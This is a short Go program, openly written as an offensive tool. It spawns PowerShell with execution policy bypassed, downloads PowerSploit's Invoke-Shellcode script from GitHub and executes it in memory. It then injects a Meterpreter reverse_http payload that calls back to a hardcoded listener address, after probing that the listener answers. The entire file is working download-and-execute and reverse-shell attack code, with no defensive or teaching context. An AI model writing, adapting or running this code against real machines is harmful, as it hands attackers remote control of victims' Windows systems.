// Powershell exploit reverse http metasploit
// It will connect with a meterpreter session running on LHOST:LPORT granting superpowers ;)

package main

import (
	"fmt"
	"net/http"
	"os/exec"
)

const (
	LHOST = "192.168.1.19"
	LPORT = 3000
)

var (
	url = "https://raw.githubusercontent.com/enigma0x3/PowerSploit/446d621c8c2e9fa9e92168aa46c3de8266ffac30/CodeExecution/Invoke--Shellcode.ps1"
	cmd = fmt.Sprintf(`IEX (New-Object Net.WebClient).DownloadString('%s')`, url)

	shell = fmt.Sprintf("Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost %s -lport %d -Force -Verbose", LHOST, LPORT)
)

func exploit() {
	if isReadyForConnection() {
		binary, _ := exec.LookPath("powershell")

		cmd := exec.Command(binary, fmt.Sprintf(`PowerShell -ExecutionPolicy Bypass -NoLogo -NoExit -Command "%s;%s"`, cmd, shell))
		cmd.Start()
	}
}

// Check if the remote host is ready for connection
func isReadyForConnection() bool {
	resp, err := http.Get(fmt.Sprintf("http://%s:%d", LHOST, LPORT))
	if resp.StatusCode == 200 && err == nil {
		return true
	}

	return false
}
